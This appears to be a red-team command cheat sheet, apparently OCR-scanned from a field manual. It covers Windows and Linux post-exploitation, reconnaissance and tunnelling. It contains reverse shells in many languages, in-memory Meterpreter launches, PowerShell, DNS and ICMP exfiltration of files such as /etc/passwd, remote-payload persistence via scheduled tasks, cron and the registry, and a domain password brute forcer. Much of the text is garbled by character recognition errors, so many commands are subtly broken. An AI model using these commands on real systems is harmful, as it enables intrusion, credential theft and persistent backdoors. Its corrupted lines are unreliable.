Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command
&{Start-Process file.exe -verb runas)'


###EMAIL SENDER
powershell.exe Send-MailMessage -to " email " -from " email " -subject
"Subject" -a " attachment file path " -body "Body" -SmtpServer Target
Email Server IP


###TURN ON POWERSHELL REMOTING (WITH VALID CREDENTIALS)
net time \\ip
at \\ip time "Powershell -Command 'Enable-PSRemoting -Force'"
at \\ip time+1 "Powershell -Command 'Set-Item
wsman:\localhost\client\trustedhosts ''"
at \ \ip time+2 "Powershell -Command 'Restart-Service WinRM'"
$s1 = new-PSSession -ComputerName ip -Credential username
enter-pssession -session $s1
copy-item "C:\myRemoteData\Scripts" -Destination "C:\mylocaldata\Scripts" -fromSession $s1
remove-pssession $s1


###LIST HOSTNAME AND IP FOR ALL DOMAIN COMPUTERS
Get-WmiObject -ComputerName DC -Namespace root\microsoftDNS -Class
MicrosoftDNS ResourceRecord -Filter "domainname=' DOl1AIN '" | select textrepresentation


###POWERSHELL DOWNLOAD OF A FILE FROM A SPECIFIED LOCATION
powershell.exe -noprofile -noninteractive -command
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback
{$true); $source="""https:// YOUR SPECIFIED IP I file.zip """;
$destination=""" C:\rnaster.zip"""; $http = new-object Systern.Net.WebClient;
$response = $http.DownloadFile($source, $destination);"


###POWERSHELL DATA EXFIL
#Script will send a file ($filepath) via http to server ($server) via POST
#request. Must have web server listening on port designated in the $server


powershell.exe -noprofile -noninteractive -command
"[System.Net.ServicePointManager] ::ServerCertificateValidationCallback
{$true); $server="""http:// YOUR SPECIFIED IP / folder """;
$filepath=""" C:\master.zip"""; $http= new=object System.Net.WebClient;
$response = $http.UploadFile($server,$filepath);"


###USING POWERSHELL TO LAUNCH METERPRETER FROM MEMORY
#Need Metasploit v4.5+ (msfvenom supports Powershell)
#Use Powershell (x86) with 32 bit Meterpreter payloads
#encodeMeterpreter.psl script can be found on next page
--ON ATTACK BOXES--
./msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.psl
Move audit.psl into same folder as encodeMeterpreter.psl
Launch Powershell(x86)
powershell.exe -executionpolicy bypass encodeMeterpreter.psl
Copy the encoded Meterpreter string
--START LISTENER ON ATTACK BOX--
./msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse https
set LHOST 1. 1. 1. 1
set LPORT 443
exploit -j
--ON TARGET (MUST USE POWERSHELL (x86))--
powershell.exe -noexit -encodedCommand paste encoded Meterpreter string here
--ENCODEMETERPRETER.PSl--
# Get Contents of Script
$contents = Get-Content audit.psl
# Compress Script
$ms = New-Object IO.MemoryStream
$action = [IO.Compression.CompressionMode]::Compress
$cs =New-Object IO.Compression.DeflateStream ($ms,$action)
$sw =New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
$contents | ForEach-Object {$sw.WriteLine($ )}
$sw.Close()
# Base64 Encode Stream
$code = [Convert]::ToBase64String($ms.ToArray())
$command= "Invoke-Expression '$(New-Object IO.StreamReader('$(New-Object IO. Compression. DeflateStream ('$(New-Object IO. MemoryStream
(, '$ ( [Convert]::FromBase64String ('"$code'")))) , [IO.Compression.CompressiontMode]: :Decompress)),
[Text.Encoding]: :ASCII)) .ReadToEnd() ;"
# Invoke-Expression $command
$bytes= [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
# Write to Standard Out
Write-Host $encodedCommand


##USING POWERSHELL TO LAUNCH METERPRETER (2ND METHOD)
--ON ATTACK BOX--
1. msfpayload windows/meterpreter/reverse tcp LHOST=10.1.1.1
LPORT=8080 R | msfencode -t psh -a x86
--ON WINDOWS ATTACK BOX--
1. c:\ powershell
2. PS c:\ $cmd = ' PASTE THE CONTENTS OF THE PSH SCRIPT HERE
3. PS c:\ $u = [Systern.Text.Encoding]: :Unicode.GetBytes($cmd)
4. PS c: \ $e = [Convert] ::ToBase64String($u)
5. PS c:\ $e
6. Copy contents of $e
--START LISTENER ON ATTACK BOX--
1. ./msfconsole
2. use exploit/multi/handler
3. set payload windows/meterpreter/reverse tcp
4. set LHOST 1.1.1.1
5. set LPORT 8080
6. exploit -j
--ON TARGET SHELL ( 1 : DOWNLOAD SHELLCODE, 2 : EXECUTE)--
'
c:\ powershell -noprofile -noninteractive -command "&
{$client~new-object Systern.Net.WebClient;$client.DownloadFile('http://1.1.1.1/shell.txt
', 'c:\windows\temp\ shell.txt')}"


c:\ powershell -noprofile -noninteractive -noexit -command "&
{$cmd=type 'c:\windows\temp\ shell.txt';powershell -noprofilenoninteractive
-noexit -encodedCornmand $cmd}"




********************  Windows Registry ***********************
###OS INFORMATION
HKLM\Software\Microsoft\Windows NT\CurrentVersion


###PRODUCT NAME
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v ProductName


###DATE OF INSTALL
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v InstallDate


###REGISTERED OWNER
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v RegisteredOwner


###SYSTEM ROOT
HKLM\Software\Microsoft\Windows NT\CurrentVersion /v SystemRoot


###TIME ZONE (OFFSET IN MINUTES FROM UTC)
HKLM\System\CurrentControlSet\Control\TimeZoneinformation /v ActiveTimeBias


###MAPPED NETWORK DRIVES
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU


###MOUNTED DEVICES
HKLM\Sjstern\MountedDevices


###USB DEVICES
HKLM\Sjstern\CurrentControlSet\Enum\USBStor


###TURN ON IP FORWARDING
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters - IPEnableRouter = 1


###PASSWORD KEYS : LSA SECRETS CAN CONTAIN VPN 1 AUTOLOGON 1 OTHER PASSWORDS
HKEY LOCAL MACHINE\Securitj\Policy\Secrets
HKCU\Soft\v~re \t1icroso ft \Windows NT\CurrentVersion \Winlogon \autoadminlogon


###AUDIT POLICY
HKLM\Security\Policy\PolAdTev


###KERNEL/USER SERVICES
HKLM\Software\Microsoft\Windows NT\CurrentControlSet\Services


###INSTALLED SOFTWARE ON MACHINE
HKLM\Software


###INSTALLED SOFTWARE FOR USER
HKCU\Software


###RECENT DOCUMENTS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs


###RECENT USER LOCATIONS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisite dtmu & \Opensavetmu


###TYPED URLs
HKCU\Software\Microsoft\Internet Explorer\TypedURLs


###MRU LISTS
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU


###LAST REGISTRY KEY ACCESSED
HKCU\Software\Microsoft\Windows\CurrentVersion\Applets\RegEdit /v LastKey


###STARTUP LOCATIONS
HKLM\Software \Microsoft\Windows\CurrentVersion\Run & \Runonce
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run & \Runonce
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows


###INTERFACE GUID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces


###IP ADDRESSES 
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\{###INTERFACE GUID###}\Parameters\Tcpip

###FIREWALL
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\sharedaccess\parameters\firewallpolicy


********************  Windows Domain ***********************
###LIST USERS ON DOMAIN WITH NO LIMIT ON RESULTS
dsquery user -limit 0


###LIST GROUPS FOR DOMAIN=VICTIM.COM
dsquery group "cn=users, dc=victim, dc=com"


###LIST DOMAIN ADMIN ACCOUNTS
dsquery group -name "domain admins" | dsget group -members -expand


###LIST ALL GROUPS FOR A USER
dsquery user -name bob | dsget user -memberof -expand


###GET A USER'S LOGIN ID
dsquery user -name bob | dsget user -samid


###LIST ACCOUNTS INACTIVE FOR 2 WEEKS
dsquery user -inactive 2


###ADD DOMAIN USER
dsadd user "CN=Bob,CN=Users,DC=victim,DC=corn" -samid bob -pwd bobpassdisplay
"Bob 11 -pwdneverexpires yes -memberof "CN=Domain Admins,CN=Users,DC=victim,DC=com"


###DELETE USER
dsrm -subtree -noprornpt "CN=Bob,CN=Users,DC=victim,DC=com"


###LIST ALL OPERATING SYSTEMS ON DOMAIN
dsquery A "DC=victim,DC=com" -scope subtree -attr "cn" "operatingSystem"
"operatingSystemServicePack" -filter " (&(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows}))"


###LIST ALL SITE NAMES
dsquery site -o rdn -limit


###LIST ALL SUBNETS WITHIN A SITE
dsquery subnet -site sitename -o rdn


###LIST ALL SERVERS WITHIN A SITE
dsquery server -site sitename -o rdn


###FIND SERVERS XN THE DOMAIN
dsquery * domainroot -filter
"(&(objectCategory=Computer) (objectClass=Computer) (operatingSystem=Server))" -limit 0


###DOMAIN CONTROLLERS PER SITE
dsquery * "CN=Sites,CN=Configuration,DC=forestRootDomain" -filter
(objectCategory=Server)




********************  Windows Scripting ***********************
#If scripting in batch file, variables must be preceeded with %%, i.e. %%i
###NESTED FOR LOOP PING SWEEP
for /L %i in (10,1,254) do @ (for /L %x in (10,1,254) do @ ping -n 1 -w 100
10.10.%i.%x 2 nul | find "Reply" && echo 10.10.%i.%x live.txt)


###LOOP THROUGH FILE
for /F %i in ( file ) do command


###DOMAIN BRUTE FORCER
for /F %n in (names.txt) do for /F %p in (pawds.txt) do net use \\DC01\IPC$
/user: domain \%n %p 1 NUL 2 &1 && echo %n:%p && net use /delete
\\DCOl\IPC$ NUL


###ACCOUNT LOCKOUT (LOCKOUT. BAT)
@echo Test run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN-
1234\c$ /USER:%%U wrongpass


###DHCP EXHAUSTION
for /L %i in (2,1,254) do (netsh interface ip set address local static
1.1.1.%i netrnask gw ID %1 ping 127.0.0.1 -n l -w 10000 nul %1)


###DNS REVERSE LOOKUP
for /L %i in (100, 1, 105) do @ nslookup l.l.l.%i | findstr /i /c:"Name"
dns.txt && echo Server: 1.1.1.%i dns.txt


###SEARCH FOR FILES BEGINNING WITH THE WORD "PASS" AND THEN PRINT IF
IT'S A DIRECTORY, FILE DATE/TIME, RELATIVE PATH, ACTUAL PATH AND SIZE (@VARIABLES ARE OPTIONAL)
forfi1es /P c:\temp /s /m pass* -c "cmd /c echo @isdir @fdate @ftime
@relpath @path @fsize"


###SIMULATE MALICIOUS DOMAIN CALLOUTS (USEFUL FOR AV/IDS TESTING)
#Run packet capture on attack domain to receive callout
#domains.txt should contain known malicious domains
for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n
attack domain NUL 2 &1 & ping -n 5 127.0.0.1 NUL 2 &1


###IE WEB LOOPER (TRAFFIC GENERATOR)
for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com
www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U &
ping -n 6 localhost & taskkill /F /IM iexplore.exe


###GET PERMISSIONS ON SERVICE EXECUTABLES
for /f ''tokens=2 delims='='" %a in ('wmic service list full | find /i
"pathname" | find /i /v "system32"') do @echo %a
c:\windows\temp\3afd4ga.tmp
for /f eol = " delims = " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe
/c icacls "%a"


###ROLLING REBOOT (REPLACE /R WITH /S FOR A SHUTDOWN) :
for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
message"


###SHELL ESCALATION USING VBS (NEED ELEVATED CREDENTIALS)
# Create .vbs script with the following
Set shell ' wscript.createobject("wscript.shell")
Shell.run "runas /user: user " & """" &
C:\Windows\System32\WindowsPowershell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c \" & """" & " IEX ((New-
Object Net.WEbClient).downloadstring(' url '))\" & """" & """"
wscript.sleep (100)
shell.Sendkeys " password " & "{ENTER}"




********************  Windows Task Scheduler ***********************
#Scheduled tasks binary paths CANNOT contain spaces because everything
after the first space in the path is considered to be a command-line
argument. Enclose the /TR path parameter between backslash (\) AND
quotation marks ("):
... /TR "\"C:\Program Files\file.exe\" -x argl"


###TASK SCHEDULER (ST=START TIME, SD=START DATE, ED=END DATE) *MUST BE ADMIN
SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD
MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\my.exe" /RU DOMAIN\ user /RP
password


###TASK SCHEDULER PERSISTENCE [10]
*For 64 bit use:
"C:\Windows\syswow64\WindowsPowerShell\vl.0\powershell.exe"


# (x86) on User Login
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object
net.webclient) .downloadstring( ''http:// ip : port / payload'''))'" /SC
onlogon /RU System


# (x86) on System Start
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object
net.webclient) .downloadstring(''http:// ip : port I payload'''))'" /SC
onstart /RU System


# (x86) on User Idle (30 Minutes)
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.0\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nop -c 'IEX ((new-object
net.webclient) .downloadstring(''http:// ip : port I payload'''))'" /SC
onidle /i 30



********************  Recon  ***********************
tcpdump -nnvX -s 0 host 8.8.8.8

nc -nv 1.1.1.1 80           #banner a web page
GET / HTTP/1.0

rpcinfo -p <ip>             #unumerates linux boxes, needs apt-get install rpcbind nfs-common
rpcclient -U "" <IP>        #enum windows boxes
nmap --script smb-os-discovery.nse -p445 <IP>
nc -nv 8.8.8.8 5985
snmpwalk -c public -v1 8.8.8.8
ls /usr/share/nmap/scripts/* | grep ftp


********************  TTL Fingerprints ***********************
Windows:        128
Linux:          64
Network:        255
Solar is:       255


********************  SubNetting ***********************
/31 255.255.255.254 1 Host
/30 255.255.255.252 2 Hosts
/29 255.255.255.248 6 Hosts
/28 255.255.255.240 14 Hosts
/2" 255.255.255.224 30 Hosts
/26 255.255.255.192 62 Hosts
/25 255.255.255.128 126 Hosts
/24 255.255.255.0 254 Hosts
/23 255.255.254.0 510 Hosts
/22 255.255.252.0 1022 Hosts
/21 255.255.248.0 2046 Hosts
/20 255.255.240.0 4094 Hosts
/19 255.255.224.0 8190 Hosts
/18 255.255.192.0 16382 Hosts
/17 255.255.128.0 32?66 Hosts
/16 255.255.0.0 65534 Hosts
/15 255.254.0.0 1310"0 Hosts
/14 255.252.0.0 262142 Hosts
/13 255.248.0.0 524286 Hosts
/12 255.240.0.0 1048574 Hosts
/11 255.224.0.0 209-150 Hosts
/10 255.192.0.0 4194302 Hosts
/9 255.128.0.0 8388606 Hosts
/8 255.0.0.0 16"'"214 Hosts




********************  IPv6 Broadcast Addresses ***********************
ff02::1- link-local nodes
ff05::1- site-local nodes
ff01::2- node-local routers
ff02::2- link-local routers
ff05::2- site-local routers




********************  IPv6 Interface Addresses ***********************
fe80:: -                        link-local
2001:: -                        routable
::a.b.c.d-                      IPv4 compatible IPv6
::ffff:a.b.c.d-                 IPv4 mapped IPv6




********************  THC IPv6 ToolKit ***********************
Remote Network DoS:
rsumrf6 eth# remote ipv6




********************  SOCAT  ***********************
###SOCAT TUNNEL IPv6 THROUGH IPv4 TOOLS
socat TCP-LISTEN:8080,reuseaddr,fork TCP6: [2001: :] :80
./nikto.pl -host 127.0.0.1 -port 8080




********************  Cisco Commands  ***********************
enable                                          #Enter privilege mode
#configure terminal                             #Configure interface
(config)#interface fa0/0                        #Configure FastEthernet 0/0
(config-if)#ip addr 1.1.1.1 255.255.255.0       #Add IP to fa0/0
(config)#line Vty 0 4                           #Configure vty line
(config-line)#login                             #1. Set telnet password
(config-line)#password password                 #2. Set telnet password
#show session                                   #Open sessions
#show version                                   #IOS version
#dir file systems                               #Available files
#dir all-filesystems                            #File information
#dir /all                                       #Deleted files
#show running-config                            #Config loaded in mem
#show startup-config                            #Config loaded at boot
#show ip interface brief                        #Interfaces
#show interface eO                              #Detailed interface info
#show ip route                                  #Routes
#show access-lists                              #Access lists
#terminal length 0                              #No limit on output
#copy running-config startup-config             #Replace run w/ start config
#copy running-config tftp                       #Copy run config to TFTP Svr


CISCO IOS 11.2-12.2 VULNERABILITY
http://ip/level/16-99/exec/show/config




********************  SNMP  ***********************
###MUST START TFTP SERVER 1ST
./snmpblow.pl -s srcip -d rtr_ip -t attackerip -f out.txt
snmpstrings.txt


###WINDOWS RUNNING SERVICES:
snmpwalk -c public -v1 ip 1 |grep hrSWRunName |cut -d" " -f4


###WINDOWS OPEN TCP PORTS :
smpwalk |grep tcpConnState |cut -d" " -f6 |sort -u


###WINDOWS INSTALLED SOFTWARE:
smpwalk |grep hrSWInstalledName


WINDOWS USERS:
snmpwalk ip 1.3 lgrep 77.1.2.25 -f4




********************  DNS ***********************
./dnsrecon.rb -t rvs -i 192.1.1.1,192.1.1.20            #Reverse lookup for IP range:
./dnsrecon.rb -t std -d domain.corn                     #Retrieve standard DNS records:
./dnsrecon.rb -t brt -d domain.corn -w hosts.txt        #Enumerate subdomains:
./dnsrecon -d domain.corn -t axfr                       #DNS zone transfer:


###NMAP REvERSE DNS LOOKUP AND OUTPUT PARSER
nmap -R -sL -Pn -dns-servers dns svr ip range | awk '{if( ($1" "$2"
"$3)=="Nmap scan report")print$5" "$6}' | sed 's/(//g' I sed 's/)//g' dns.txt




********************  File Transfer ***********************
###FTP THROUGH NON-INTERACTIVE SHELL
echo open ip 21 ftp.txt
echo user ftp.txt
echo pass ftp.txt
echo bin ftp.txt
echo GET file ftp.txt
echo bye ftp.txt
ftp -s:ftp.txt


###DNS TRANSFER ON LINUX
On victim:
1. Hex encode the file to be transferred
xxd -p secret file.hex
2. Read in each line and do a DNS lookup
for b in 'cat file.hex '; do dig $b.shell.evilexample.com; done
On attacker:
1. Capture DNS exfil packets
tcdpump -w /tmp/dns -s0 port 53 and host system.example.com
2. Cut the exfilled hex from the DNS packet
tcpdump -r dnsdemo -n | grep shell.evilexample.com | cut -f9 -d'
cut -fl -d'.' | uniq received.txt
3. Reverse the hex encoding
xxd -r -p received.txt keys.pgp


###EXFIL COMMAND OUTPUT ON A LINUX MACHINE OVER ICMP
On victim (never ending l liner) :
stringZ=*cat /etc/passwd | od -tx1 | cut -c8- | tr -d " " | tr -d "\n";
counter-0; while (($counter - ${#stringZ})};do ping -s 16 -c l -p
${stringZ:$counter:16} 192.168.10.10 &&
counter=$( (counter+16)) ;done
On attacker (capture packets to data.dmp and parse):
tcpdump -ntvvSxs 0 'icmp[0]=8' data.dmp
grep Ox0020 data.dmp | cut -c21- | tr -d " " | tr -d "\n" | xxd -r -p




********************  Open Mail Relay ***********************
C:\ telnet x.x.x.x 25
HELO x.x.x.
MAIL FROM: me@you.com
RCPT TO: YOU@you.com
DATA
Thank You.
.
Quit




********************  Reverse Shells ***********************


###NETCAT (* START LISTENER ON ATTACK BOX TO CATCH SHELL)
nc 10.0.0.1 1234 -e /bin/sh                                #Linux reverse shell
nc 10.0.0.1 1234 -e cmd.exe                                #Windows reverse shell


###NETCAT (SOME VERSIONS DON'T SUPPORT -E OPTION)
nc -e /bin/sh 10.0.0.1 1234


###NETCAT WORK-AROUND WHEN -E OPTION NOT POSSIBLE
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 &l|nc 10.0.0.1 1234 /tmp/f


###PERL
perl -e 'use Socket; $i=:10.0.0.1”; $p=1234 socket(S,PF INET, SOCK STREAM,
getprotobjname("tcp")); if(connect(S,sockaddr in($p,inet-aton($i)))){
open(STDIN," &S") ;open(STDOUT," &S"); open (STDERR,” $S”); exec("/bin/sh -e
i" ); };'


###PERL WITHOUT /BIN/SH
perl -MIO -e ‘$p=fork; exit, if ($p);$c=new
IO::Socket::INET(PeerAddr,"attackerip:4444") ;STDIN- fdopen($c,r) ;$~-
fdopen($c,w) ;system$_ while  ;'


###PERL FOR WINDOWS
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,''attackerip:4444'') ;STDIN-
fdopen($c,r) ;$~- fdopen($c,w) ;system$ while ;'


###PYTHON
python -c 'import socket,subprocess, os; s=socket..socket (socket.AF _ INET,
socket.SOCK_STREAM); s.connect( ("10.0.0.1",1234)); os.dup2 (s.fileno() ,0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
p=subprocess.call([“/bin/sh","-i"]);'


###BASH
bash -i & /dev/tcp/10.0.0.1/8080 0 &1


###JAVA
r = Runtime.getRuntime()
p = r.exec( ["/bin/bash","-c","exec 5 /dev/tcp/10.0.0.1/2002;cat &5 |
while read line; do \$line 2 &5 &5; done"] as String[])
p.waitFor()


###PHP
php -r ‘$sock=fsockopen (“10.0.0.1”,1234) ;exec("/bin/sh -i &3 &3 2 &3");'


###RUBY
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234) .to i; exec
sprintf("/bin/sh -i &%d &%d 2 &%d",f,f,f)'


###RUBY WITHOUT /BIN/ SB
by -rsocket -e 'exit if
fork;c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen(cmd, “r
") { |io|c.print io.read}end'


###RUBY FOR WINDOWS
ruby -rsocket -e
'c=TCPSocket.new("attackerip","4444");while(crnd=c.gets);IO.popen{cmd,"r” ) {|
io|c.print io.read}end'


###TELNET
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
--OR--
telnet attackerip 4444 I /bin/bash I telnet attackerip 4445


###X TERM
xterm -display 10.0.0.1:1
o Start Listener: Xnest :1
o Add permission to connect: xhost +victimiP


###Misc
wget hhtp:// server /backdoor.sh -0- I sh Downloads and runs backdoor.sh




********************  Persistence ***********************


###FOR LINUX PERSISTENCE (ON ATTACK BOX)
crontab -e : set for every 10 min
0-59/10 ' ' ' ' nc ip 777 -e /bin/bash


###WINDOWS TASK SCHEDULER PERSISTENCE (START TASK SCHEDULER)
sc config schedule start=auto
net start schedule
at 13:30 ''''C:\nc.exe ip 777 -e cmd.exe''''


###WINDOWS PERSISTENT BACKDOOR WITH FIREWALL BYPASS
1. REG add HKEY_CURRENT USER\Software\l1icrosoft\Windows\CurrentVersion\Run
/v firewall /t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /M0 45 /TN FIREWALL /TR
"%USERPROFILE%\backdoor.exe" /ED 12/12/2012


###REMoTE PAYLOAD DEPLO"!MENT VIA SMB OR WEBDAV [ 6]
Via SMB:
1. From the compromised machine, share the payload folder
2. Set sharing to 'Everyone'
3. Use psexec or wmic command to remotely execute payload
Via WebDAV:
1. Launch Metasploit 'webdav file server' module
2. Set following options:
        -localexe=true
        -localfile= payload
        -localroot= payload directory
        -disablepayloadhandler=true
3. Use psexec or wmic command to remotely execute payload


psexec \\ remote ip /u domain\compromised_user /p password "\\payload
ip \test\msf.exe"


--OR -
wmic /node: remote ip /user:domain\compromised user //password:password
process call create "\ \ payload ip \test\msf.exe"




********************  Tunneling ***********************


###FPIPE - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2
fpipe.exe -l 1234 -r 80 2.2.2.2


###SOCKS.EXE- SCAN INTRANET THROUGH SOCKS PROXY
On redirector (1.1.1.1):
socks.exe -i1.1.1.1 -p 8080


On attacker:
Modify /etc/proxychains.conf:
Comment out: #proxy_dns
Comment out: #socks4a 12~.0.0.1 9050
Add line: socks4        1.1.1.1        8080
Scan through socks proxy:
proxychains nmap -PN -vv -sT -p 22,135,139,445 2.2.2.2


###SOCAT - LISTEN ON 1234 AND FORWARD TO PORT 80 ON 2. 2. 2. 2
Socat TCP4:LISTEN:1234 TCP4:2.2.2.2:80


###STUNNEL - SSL ENCAPSULATED NC TUNNEL (WINDOWS & LINUX) [ 8]
ON attacker (client):
Modify /stunnel.conf
client. = yes
[netcat client]
accept = 5555
connect = -Listening IP-:4444


On victim (listening server)
Modify /stunnel.conf
client = no
[netcat server]
accept 4444
connect =
C:\ nc -vlp ----


On attacker (client)
# nc -nv 12-.0.C.1 5555


###NC PIVOT
cd /tmp
mknod backpipe q
nc -v -l -p 4444 0<backpipe | nc <T1IP> 80 | tee backpipe

###Dynamic SSH Socks Tunnel with proxychains
ssh /tmp/Rd.s user -Nf -D 0.0.0.0:1090
proxychains /bin/bash
socat UDP-listen:22,reuseaddr,fork UDP:10.10.100.170:22 &
socat tcp4-listen:22,reuseaddr,fork tcp-4:10.10.100.170:22 &



********************  NMAP  ***********************


###SCAN TYPES
-sP                                                #ping scan
-sS                                                #syn scan
-sT                                                #connect scan
-su                                                #udp scan
-so                                                #protocol scan


###OPTIONS
-p1-65535                                          #ports
-T[0-5]                                            #0=5m, 1=15s, 2= .4s
-n                                                 #no dns resolution
-0                                                 #OS detection
-A                                                 #aggressive scan
-sv                                                #version detection
-PN                                                #no ping
-6                                                 #IPv6 scan
--randomize-hosts


###OUTPUT I INPUT
-ox file                                           #write to xml file
-oG file                                           #write to grep file
-oA file                                           #save as all 3 formats
-iL file                                           #read hosts from file
-exclude file file                                 #excludes hosts in file


###ADVANCED OPTIONS
-sV -p#         --script=banner                        
-traceroute
-ttl                                               #set TTL
--script                                           #runs script


###FIREWALL EVASION
-f                                                 #fragment packets
-s ip                                              #spoof src
-g #                                               #spoof src port
-D ip , ip                                         #Decoy
--mtu #                                            #set MTU size
--spoof-mac mac
--data-length size                                 #append random data
--scan-delay 5s


###CONVERT NMAP XML FILE TO HTML:
xsltproc nmap.xml -o nmap.html


###GENERATE LIVE HOST FILE:
nmap -sP -n -oX out.xml 1.1.1.0/24 2.2.2.0/24 | grep "Nmap" | cut -d " " -f 5 live_hosts.txt


###COMPARE NMAP RESULTS
ndiff scanl.xml scan2.xml


###DNS REVERSE LOOKUP ON IP RANGE
nmap -R -sL -dns-server server 1.1.1.0/24


###IDS TEST (XMAS SCAN WITH DECOY IPS AND SPOOFING)
for x in {1 ..10000 ..1);do nmap -T5 -sX -S spoof-source-IP -D comma-
seperated with no spaces list of decoy IPs --spoof-mac aa:bb:cc:dd:ee:ff -e eth0 -Pn targeted-IP ;done
